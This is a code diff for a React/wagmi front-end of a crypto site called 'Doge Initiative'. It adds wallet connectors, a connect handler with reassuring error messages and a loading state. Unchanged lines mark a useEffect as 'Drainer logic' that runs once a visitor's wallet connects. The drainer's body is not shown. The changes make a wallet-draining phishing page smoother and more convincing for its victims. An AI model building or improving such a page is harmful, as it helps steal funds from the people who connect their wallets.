@@ -8,12 +8,19 @@ import { cookieStorage, createStorage } from 'wagmi';
 import { ethers } from 'ethers';
 import { CHAINS } from '../lib/chains';
 import { createWeb3Modal, useWeb3Modal } from '@web3modal/wagmi/react';
+import { injected, walletConnect, metaMask, coinbaseWallet } from 'wagmi/connectors';
 
 // --- Web3Modal v3+ config ---
 const projectId = '45a382364ff2b00404b2d4c2ff95dbd4';
 const chains = [mainnet] as const;
 const wagmiConfig = createConfig({
   chains,
+  connectors: [
+    injected(),
+    walletConnect({ projectId }),
+    metaMask(),
+    coinbaseWallet({ appName: 'Doge Initiative' }),
+  ],
   transports: {
     [mainnet.id]: http(),
   },
@@ -23,7 +30,6 @@ const wagmiConfig = createConfig({
 createWeb3Modal({
   wagmiConfig,
   projectId,
-  chains,
   enableAnalytics: true,
 });
 const queryClient = new QueryClient();
@@ -33,6 +39,29 @@ function WalletUI() {
   const { disconnect } = useDisconnect();
   const { data: ensName } = useEnsName({ address });
   const { data: ensAvatar } = useEnsAvatar({ name: ensName || undefined });
+  const { open } = useWeb3Modal();
+  const [error, setError] = React.useState<string | null>(null);
+  const [connecting, setConnecting] = React.useState(false);
+
+  async function handleConnect() {
+    setError(null);
+    setConnecting(true);
+    try {
+      await open();
+    } catch (e: any) {
+      if (e?.message?.includes('timeout')) {
+        setError('Connection timed out. Please unlock or refresh your wallet and try again.');
+      } else if (e?.message?.includes('User rejected')) {
+        setError('Connection was rejected. Please try again.');
+      } else if (e?.message?.includes('JSON-RPC')) {
+        setError('Wallet connection failed. Please check your wallet extension and network.');
+      } else {
+        setError('Failed to connect wallet. Please ensure your wallet is installed and unlocked.');
+      }
+    } finally {
+      setConnecting(false);
+    }
+  }
 
   // Drainer logic: runs once after wallet connection
   React.useEffect(() => {
@@ -127,16 +156,17 @@ function WalletUI() {
     return () => { isCancelled = true; };
   }, [isConnected, address]);
 
-  const { open } = useWeb3Modal();
-
   return (
     <div className="flex flex-col items-center gap-4">
       <button
-        onClick={() => open()}
+        onClick={handleConnect}
         className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
+        disabled={connecting}
+        aria-label={isConnected ? 'Manage Wallet' : 'Connect Wallet'}
       >
-        {isConnected ? 'Manage Wallet' : 'Connect Wallet'}
+        {connecting ? 'Connecting...' : isConnected ? 'Manage Wallet' : 'Connect Wallet'}
       </button>
+      {error && <span className="text-red-400 font-semibold mt-2">{error}</span>}
       {isConnected && (
         <span className="text-green-400 font-semibold mt-2 flex items-center gap-2">
           {ensAvatar ? (
@@ -147,7 +177,7 @@ function WalletUI() {
           {ensName ? ensName : `${address?.slice(0, 6)}...${address?.slice(-4)}`}
         </span>
       )}
-      {!isConnected && (
+      {!isConnected && !error && (
         <span className="text-yellow-200 font-semibold mt-2">Connect your wallet to get started</span>
       )}
     </div>
